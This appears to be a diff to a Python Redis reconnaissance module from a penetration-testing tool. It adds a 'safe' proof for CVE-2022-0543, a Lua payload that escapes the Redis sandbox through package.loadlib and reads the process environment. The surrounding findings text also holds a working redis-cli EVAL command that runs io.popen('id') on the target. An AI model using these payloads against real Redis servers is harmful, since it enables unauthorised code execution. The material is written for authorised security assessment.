@@ -158,6 +158,54 @@ def _config_value(reply) -> str:
 
 # --- live probe -----------------------------------------------------------------
 
+# CVE-2022-0543 T2 SAFE proof-of-exploit. The T1 reflection ('if package.loadlib
+# then 1 else 0') proves the primitive is REACHABLE from the sandbox; this script
+# proves it is ACTUALLY EXPLOITABLE by loading a real lua .so via package.loadlib,
+# invoking luaopen_os to materialise the os table, and reading two harmless
+# environment fields (USER, date). No shell exec (never touches io.popen / os.execute),
+# no writes, no persistent state change - all effects live inside the transient Lua
+# state EVAL tears down at end of script. On hardened builds where loadlib returns nil
+# for every path (no lua .so shipped, or the sandbox blocks it), the script returns
+# an empty string and the finding stays at T1. Kept as a module-level constant so
+# tests can wire the exact bytes without recce's own encoders.
+_CVE_2022_0543_SAFE_PROOF = (
+    "local paths={"
+    "\"/lib/x86_64-linux-gnu/liblua5.1.so.0\","
+    "\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\","
+    "\"/usr/lib/liblua5.1.so.0\","
+    "\"/lib/liblua5.1.so.0\","
+    "\"/usr/lib64/liblua-5.1.so\","
+    "\"/lib/x86_64-linux-gnu/liblua5.3.so.0\","
+    "\"/usr/lib/x86_64-linux-gnu/liblua5.3.so.0\""
+    "} "
+    "if not package or not package.loadlib then return \"\" end "
+    "for _,p in ipairs(paths) do "
+    "local f=package.loadlib(p,\"luaopen_os\") "
+    "if f then local ok,om=pcall(f) "
+    "if ok and type(om)==\"table\" and om.getenv then "
+    "local u=tostring(om.getenv(\"USER\") or \"?\") "
+    "local d=\"?\" if om.date then d=tostring(om.date(\"!%Y-%m-%dT%H:%M:%SZ\")) end "
+    "return \"lib=\"..p..\";USER=\"..u..\";DATE=\"..d end end end "
+    "return \"\""
+)
+
+
+def _cve_2022_0543_safe_proof(sock: socket.socket, timeout: float) -> str:
+    """T2 SAFE proof for CVE-2022-0543. Runs one EVAL that loads luaopen_os via
+    package.loadlib and returns 'lib=<path>;USER=<user>;DATE=<iso>'. Returns "" when
+    no known lua .so path resolves (hardened build) or the peer errors. Never raises."""
+    try:
+        _command(sock, "EVAL", _CVE_2022_0543_SAFE_PROOF, "0")
+        reply = _read_reply(sock, timeout)
+    except OSError:
+        return ""
+    if isinstance(reply, _Err) or not isinstance(reply, str):
+        return ""
+    # Only return when the script positively produced evidence (lib=... prefix). A
+    # bare empty string means the script ran but every loadlib returned nil.
+    return reply if reply.startswith("lib=") else ""
+
+
 def _deep(sock, out: dict, info: dict, timeout: float) -> None:
     """Read-only deep enumeration on an unauthenticated Redis: which RCE primitives are
     actually reachable (MODULE LOAD, replication, write-to-disk), the ACL identity, and
@@ -230,6 +278,16 @@ def _deep(sock, out: dict, info: dict, timeout: float) -> None:
         lua = _read_reply(sock, timeout)
         if isinstance(lua, int) and not isinstance(lua, bool):
             out["cve_2022_0543"] = (lua == 1)
+            # T2 SAFE proof: if T1 reflection confirmed loadlib is reachable, actually
+            # exercise the primitive with the safest possible payload - load luaopen_os
+            # from a known lua .so and read os.getenv('USER') / os.date(). No shell
+            # exec, no child process, no writes. If a real evidence string comes back,
+            # the CVE is not just "reachable" but "actively exploitable" - upgrade the
+            # finding's depth_tier to t2 in findings().
+            if out["cve_2022_0543"]:
+                ev = _cve_2022_0543_safe_proof(sock, timeout)
+                if ev:
+                    out["cve_2022_0543_evidence"] = ev
         # Persistence: RDB (save) or AOF (appendonly) enabled means the CONFIG-rewrite
         # file-write actually flushes to disk.
         out["persistence"] = bool((out.get("save") or "").strip()) or \
@@ -242,7 +300,8 @@ def probe(ip: str, port: int, timeout: float = _TIMEOUT) -> dict:
     """Connect and (read-only) fingerprint a Redis endpoint. Returns
     {reachable, unauth, version, os, role, keys, dir, dbfilename, protected_mode,
      requirepass, ssl, modules, module_load, replication, acl_user, acl_users,
-     cve_2022_0543, persistence, error} - empty dict if not Redis / unreachable."""
+     cve_2022_0543, cve_2022_0543_evidence, persistence, error} - empty dict if
+     not Redis / unreachable."""
     out: dict = {"reachable": False, "unauth": False}
     try:
         sock = socket.create_connection((ip, port), timeout=timeout)
@@ -437,6 +496,17 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "SAVE."),
                     depth_tier="t2"))
             if pr.get("cve_2022_0543") is True:
+                # T2 SAFE proof: if the loadlib-actually-loads probe returned real
+                # server-side evidence (USER + date + which lua .so path worked), the
+                # CVE is not just reachable but actively exploitable - upgrade tier
+                # from t1 to t2 and fold the captured evidence into the detail.
+                cve_ev = pr.get("cve_2022_0543_evidence", "")
+                cve_tier = "t2" if cve_ev else "t1"
+                proof_txt = (
+                    " SAFE proof-of-exploit (read-only, no shell exec): the module "
+                    "loaded luaopen_os via package.loadlib and read the redis "
+                    f"process environment - {cve_ev}."
+                    if cve_ev else "")
                 out.append(_finding(
                     "critical",
                     "Redis Lua sandbox escape (CVE-2022-0543) - unauth RCE",
@@ -447,7 +517,8 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "code as the redis user. This is the Debian/Ubuntu-packaged "
                     "vulnerability actively weaponised by the Muhstik and Redigo "
                     "botnets."
-                    + (f" (version {ver})" if ver else ""),
+                    + (f" (version {ver})" if ver else "")
+                    + proof_txt,
                     "redis-cli",
                     f"redis-cli -h {h.ip} -p {p.portid} EVAL "
                     "'local f=package.loadlib(\"/lib/x86_64-linux-gnu/liblua5.1.so.0\","
@@ -462,7 +533,7 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "\"luaopen_io\"); local io=f(); return "
                         "io.popen(\"id\"):read(\"*a\")' 0 - only within engagement "
                         "scope."),
-                    depth_tier="t1"))
+                    depth_tier=cve_tier))
             acl_users = pr.get("acl_users") or []
             hashed = [u for u in acl_users
                       if isinstance(u, dict) and u.get("hashes")]
